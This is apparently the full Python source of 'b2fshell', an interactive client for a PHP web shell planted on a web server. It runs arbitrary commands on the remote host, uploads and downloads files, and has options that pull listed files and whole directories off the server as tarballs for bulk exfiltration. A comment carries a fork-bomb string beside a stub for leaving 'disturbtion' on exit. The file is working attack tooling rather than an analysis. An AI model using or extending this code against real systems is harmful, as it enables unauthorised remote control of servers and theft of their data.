#!/usr/bin/env python3
import sys, os
from cmd import Cmd
from colorama import Fore, Back, Style
import requests
import json
import base64
import pathlib
import datetime


asciifelx="""
______  _____ ______   _   _            _  _ 
| ___ \/ __  \|  ___| | | | |          | || |
| |_/ /`' / /'| |_   / __)| |__    ___ | || |
| ___ \  / /  |  _|  \__ \| '_ \  / _ \| || |
| |_/ /./ /___| |    (   /| | | ||  __/| || |
\____/ \_____/\_|     |_| |_| |_| \___||_||_|
"""


#Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
#Back: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
#Style: DIM, NORMAL, BRIGHT, RESET_ALL

target=""
disturb=False
CWD="~"
host=None


class MyPrompt(Cmd):
    def update_prompt(self):
        global CWD,host
        self.prompt = Fore.GREEN+"b2fsh@"+host+Fore.WHITE+":"+Fore.BLUE+CWD+Fore.WHITE+" $ "+Style.RESET_ALL

    def do_upload(self, inp):
        inp=inp.split(" ")
        if len(inp)>=2:
            upload(inp[0],inp[1])
        elif inp[0]:
            upload(inp[0],inp[0])
        self.update_prompt()

    def do_shell(self, inp):
        print(os.popen('/bin/bash -c "'+inp+'"').read(), end='')

    def complete_shell(self, text, line, begidx, endidx):
        line=line.split(" ")
        if len(line)>2:
            return os.popen('/bin/bash -c "compgen -f '+text+'"').read().split("\n")
        else:
            return os.popen('/bin/bash -c "compgen -c '+text+'"').read().split("\n")

    def complete_upload(self, text, line, begidx, endidx):
        line=line.split(" ")
        if len(line)<=2:
            li = os.popen('/bin/bash -c "compgen -f '+text+'"').read().split("\n")
            li=list(filter(None,li))
            return li
        else:
            resp = request("?feature=hint",{"filename": text, "cwd": CWD, "type": "file"})
            resp["files"]=list(filter(None,resp["files"]))
            return resp["files"]

    def default(self, inp):
        shell(inp)
        self.update_prompt()

    def completedefault(self, text, line, begidx, endidx):
        line=line.strip().split(" ")
        #print(line)
        resp = request("?feature=hint",{"filename": line[-1], "cwd": CWD, "type": "file"})
        resp["files"]=list(filter(None,resp["files"]))
        resp["files"]=[text[text.startswith("/") and len("/"):] for text in resp["files"]]
        #print(resp["files"])
        print(line)
        return resp["files"]

    def completenames(self, text, *ignored):
        dotext = 'do_'+text
        docmds = [a[3:] for a in self.get_names() if a.startswith(dotext)]
        resp = request("?feature=hint",{"filename": text, "cwd": CWD, "type": "cmd"})
        resp["files"]=list(filter(None,resp["files"]))
        return docmds+resp["files"]
        
    def do_exit(self, inp):
        print("")
        global fork
        if disturb:
            disturbtion()
        
        timestamp = datetime.datetime.now().strftime("%H:%M:%S.%f")
        log("exited: "+timestamp)
        return True

    do_EOF = do_exit

    def do_foo(self,inp):
        print(inp)


def request(url, params):
    global target
    return requests.post(target+url, data=params).json()

def gather_infos(): #every file of file-locations.txt until an empty line occurs
    log("getting most important information:")
    global target
    f = open("file-locations.txt","r")
    while l := f.readline():
        if l.strip():
            shell("download "+l)
        else:
            return f
    f.close()

def gather_more(): #every file after the empty line #TODO support for wildcard in path
    global target
    f=gather_infos() #more should always include the most important and most important should always be first
    log("getting more information:")
    while l := f.readline():
        if l:= l.strip():
            if l.endswith("/"):
                #tar -zcvf archive-name.tar.gz directory-name #tar -zcvf test.tar.gz -C ~/test .
                name=l.split("/")[-2]
                shell("tar -zcvf "+name+".tar.gz -C "+l+" .")
                shell("download "+name+".tar.gz")
            else:
                shell("download "+l)

def shell(command):
    global CWD
    resp = request("?feature=shell", {"cmd": command, "cwd": CWD})
    if "file" in resp:
        download(resp["name"], resp["file"])
    else:
        print("\n".join(resp["stdout"]))
        CWD = resp["cwd"]

def download(name,file):
    log("Download "+name)
    pathlib.Path("download").mkdir(parents=True, exist_ok=True)
    f=open("download/"+name,"wb")
    f.write(base64.b64decode(file))
    f.close()
    log("Download complete")

def upload(localname,remotename):
    f=open(localname,"rb")
    file=base64.b64encode(f.read())
    f.close()
    resp=request("?feature=upload",{"path":remotename,"file":file,"cwd":CWD})
    log("\n".join(resp["stdout"]))

def disturbtion(): #:(){ :|:& };:
    log("leaving disturbtion")
    pass

def execFile(filename,myp):
    f=open(filename,"r")
    while l := f.readline():
        myp.onecmd(l)

def log(msg):
    print(Fore.CYAN+msg+Style.RESET_ALL)

def warn(msg):
    print(Fore.YELLOW+msg+Style.RESET_ALL)

#TODO add file support
def main(target, infos: ('extracts the most important information', 'flag', 'i'),more: ('extracts the all important information', 'flag', 'm'),disturb: ('leaves disturbtion', 'flag', 'd'),auto: ('non interactive', 'flag', 'a'),filein: ("readin file to exec", 'option', 'f')):
    "Use with b2fshell.php or b2fshell-headless.php"
    globals()['target'] = target
    globals()['disturb'] = disturb
    globals()['host'] = target.replace("http://","").replace("https://","").split('/')[0]
    if more:
        gather_more()
    elif infos:
        gather_infos()

    myp=MyPrompt()

    if filein:
        execFile(filein,myp)

    if not auto:
        myp.update_prompt()
        myp.cmdloop(intro=asciifelx)
    else:
        if disturb:
            disturbtion()
        warn("--auto specified: terminating")
if __name__ == '__main__':
    import plac; plac.call(main)
